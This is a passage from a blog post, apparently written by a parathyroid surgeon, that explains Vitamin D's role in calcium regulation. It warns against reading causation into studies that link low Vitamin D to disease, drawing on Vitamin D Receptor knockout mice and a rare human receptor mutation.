 </p><p id="viewer-49tlt">First, why I’m interested in Vitamin D: I’m a parathyroid surgeon, and the vitamin is something I track closely in my patients. For background, the parathyroid glands are tiny endocrine organs in your neck that regulate blood calcium levels. They do this partly through the activation of Vitamin D, which helps the intestines absorb calcium. Without Vitamin D, you will have difficulty getting enough calcium, even if you are taking calcium supplements. Your bones need calcium, so a severe deficiency in Vitamin D leads to bone deformities in children (rickets) and bone loss in adults (osteomalacia). </p><div id="viewer-bovng"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.devaboone.com/post/vitamin-d-part-1-back-to-basics" data-pin-media="https://static.wixstatic.com/media/3e0600_4a3a0724a42049019ad1182bcdb30d79~mv2.png/v1/fit/w_700,h_375,al_c,q_80/file.png" src="https://static.wixstatic.com/media/3e0600_4a3a0724a42049019ad1182bcdb30d79~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-csmdc"><em> Normal child femurs compared to femurs of a child with rickets. Rickets is caused by a severe Vitamin D deficiency while bones are growing. This condition is now very rare in the U.S. due to the fortification of almost all milk with Vitamin D.* </em></p><p id="viewer-6lba0">The relationship between parathyroid hormone, calcium, and Vitamin D is complex and fascinating (at least to a parathyroid surgeon), but the vitamin appears to do much more than just influence calcium. We’re still figuring out all that it does, but we have some circumstantial evidence about its roles. Low Vitamin D levels are linked to a variety of illnesses including cancers, hypertension, diabetes, obesity, heart failure, stroke, dementia, autoimmune disease, and respiratory tract infections (including Covid-19). A simple search of the medical literature on PubMed produces page after page of articles on the harms of Vitamin D deficiency. </p><p id="viewer-5l5ac"><strong>Most studies follow this pattern:</strong> Two sets of people are evaluated. One set has a certain disease (diabetes, for example). The other set does not have the disease. Vitamin D levels are measured in both groups. Vitamin D deficiency is found to be much more common in the group of diseased individuals. </p><p id="viewer-4f52t">Using this study method, Vitamin D deficiency is correlated with many diseases. But correlation does not equal causation. The fact that two things are related does not imply that one caused the other. With regard to the vitamin and diabetes, it could be that diabetes causes low Vitamin D. Or it may be that some other health condition causes both low Vitamin D and diabetes. Obesity, for example, is a known risk factor for diabetes, and people who are obese also tend to have low Vitamin D levels, due mostly to the dilution of the fat-soluble vitamin in the larger mass of adipose tissue. The close association between Vitamin D and diabetes could be due simply to the association they both share with obesity. </p><p id="viewer-1plm0">Here is another example: Early interest in respiratory infections and Vitamin D was due to research on hospitalized children. Young children who were hospitalized with respiratory infections were found to have much higher rates of rickets than children hospitalized for other causes.(3) Rickets, of course, is caused by Vitamin D deficiency. If Vitamin D deficiency also causes immune dysfunction, we might come up with an explanation for how low Vitamin D in these children made them more susceptible to infection. But there are other explanations. Children with a serious vitamin deficiency are likely to be less healthy overall compared to non-deficient children. In addition, rickets can cause rib deformities, which are known to make it harder to cough and breathe deeply, leading to an increased risk of respiratory infections. Vitamin D itself is not necessary for explaining the infections in these children. 
 </p><p id="viewer-8d45v">Most researchers understand that correlation does not equal causation. The classic example of this involves the correlation between ice cream and violent crime. As ice cream consumption rises, so does the rate of violent crime. The association is strong, and puzzling, until you remember that more ice cream is sold during warmer months, which is also when violent crime rates rise. Ice cream has no causative connection to crime. </p><div id="viewer-8u104"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.devaboone.com/post/vitamin-d-part-1-back-to-basics" data-pin-media="https://static.wixstatic.com/media/3e0600_7750c8e0f0804ca7b241349a5caa3f6a~mv2.jpg/v1/fit/w_900,h_720,al_c,q_80/file.png" src="https://static.wixstatic.com/media/3e0600_7750c8e0f0804ca7b241349a5caa3f6a~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-2muq9"><em>Children about to embark on a life of crime?</em></p><p id="viewer-i9b6"><strong>But the temptation to equate correlation and causation is strong.</strong> Many articles showing a correlation with Vitamin D will add an untested but completely plausible physiological explanation for how low vitamin levels could lead to the disease. Armed with a solid correlation and a reasonable argument for causation, they may feel justified in concluding that the evidence for causation is strong. And once you have made that leap, you are almost obligated in recommending Vitamin D supplementation for anyone affected by or concerned about your disease of interest. </p><p id="viewer-9rfi1">Assuming that the correlations between Vitamin D and various illnesses are accurate, the argument for supplementation then depends on the plausibility of the physiologic mechanism. The numerous conditions associated with the deficiency involve disparate organs and body systems. To understand how one vitamin could be involved in so much, and whether we can explain a disease state by the vitamin's deficiency, it helps to know the basics of what Vitamin D does on a molecular level.</p><p id="viewer-ccvgc"><strong>Vitamin D is a hormone that binds to the Vitamin D Receptor</strong>, a protein made by cells throughout your body. The vitamin acts like a key, while the receptor is a lock. A key and lock are pointless individually, but useful together. Vitamin D and its receptor are inactive until they combine, and then they interact with DNA to produce certain actions within the cell. Based on what we already know, it is easy to understand why the intestines, parathyroids, and bones make Vitamin D Receptors – these organs are all involved in regulating calcium levels, and we know Vitamin D regulates calcium metabolism. But those are not the only organs that have the receptors. We find these receptors all over the place, in the kidneys, lungs, pancreas, uterus, and blood cells involved in immune function, just to name a few.(4,5) </p><p id="viewer-5olt1">Our bodies like to conserve resources, so if an organ or cell uses energy and resources to make these receptors, we can assume that they use them. This is the first solid piece of evidence that Vitamin D is involved in many processes throughout multiple organs. The next goal is to figure out how the organs use Vitamin D. There are various ways to do this. One clever method involves the use of mutant mice called “knockout mice” that have been genetically modified to inactivate a specific gene. In this case, the gene for the Vitamin D Receptor is inactivated, to produce "VDR null" mice. Studies in these animals provide important clues about Vitamin D, since without the lock, or receptor, the key is useless. As expected, these knockout mice have problems with calcium absorption, and the most notable effect is stunted bone growth.(6) This can be mitigated by giving the mice lots of calcium, which makes sense, since it is possible but harder for calcium to be absorbed without Vitamin D.</p><div id="viewer-3qo09"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.devaboone.com/post/vitamin-d-part-1-back-to-basics" data-pin-media="https://static.wixstatic.com/media/a27d24_ea278d26b9924aa2b2b0105b816d4c62~mv2.jpg/v1/fit/w_887,h_377,al_c,q_80/file.png" src="https://static.wixstatic.com/media/a27d24_ea278d26b9924aa2b2b0105b816d4c62~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-75iel"><em>Knockout mice are mice that have been genetically modified to inactivate a specific gene. VDR null mice are knockout mice that do not make Vitamin D Receptors. (The mouse in the photo is just a random mouse. We don't actually grow them in petri dishes.)</em></p><p id="viewer-4s6nd">But we already knew about Vitamin D and calcium. What about those other effects? VDR null mice should be helpful in explaining Vitamin D’s other roles, and we do see some revealing changes: these mutant mice on average have higher blood pressure than normal mice, and mice lacking the receptor specifically on the heart have decreased cardiac function. Certain immune cells also seem to also be impaired in the mutant mice.</p><p id="viewer-fakeg">Following this out a few steps, we could come up with a logical explanation for how Vitamin D helps the immune system, and thus deficiency would lead to impaired immune function, which then lead to increased susceptibility to infections. It sounds reasonable. But there are a few assumptions we are making: 1. We assume that Vitamin D deficiency is similar to a complete absence of the receptor. This is questionable, since even people with severe Vitamin D deficiencies still have some amount of Vitamin D. 2. We also assume that the receptor works exactly the same in mice as it does in humans. Mice and humans are relatively close on the evolutionary tree (when compared to, say, shiitake mushrooms), so this could be true, but maybe not.</p><p id="viewer-5b36s">Maybe we need to go back to humans. Interestingly, there is a very rare condition in humans characterized by ineffective Vitamin D Receptors due to a genetic mutation, similar to the VDR null mice.(7) Like the mice, these individuals will develop severely abnormal bone growth if untreated. Thinking logically and using what we know about the receptor in mice, we might expect that these individuals who cannot process Vitamin D effectively would have immune dysfunction, and perhaps cardiac issues. So far, we have not seen this. They do not appear to have an increased risk of cancer, respiratory infections, diabetes, or any of the other conditions found to be associated with Vitamin D deficiency. This genetic defect is extremely rare, though, and we have not yet been able to study these patients over a lifetime, so we may have more to learn. </p><p id="viewer-1lu5r">Studying the Vitamin D Receptor in living bodies is not the only way to assess Vitamin D’s actions. We can also study Vitamin D in a lab, using living cells in a test tube or culture dish. Much of our evidence for a link between Vitamin D and immunity comes from these <em>in vitro</em> studies. Vitamin D Receptors are …</p></div></div></div></div></article></div></div>
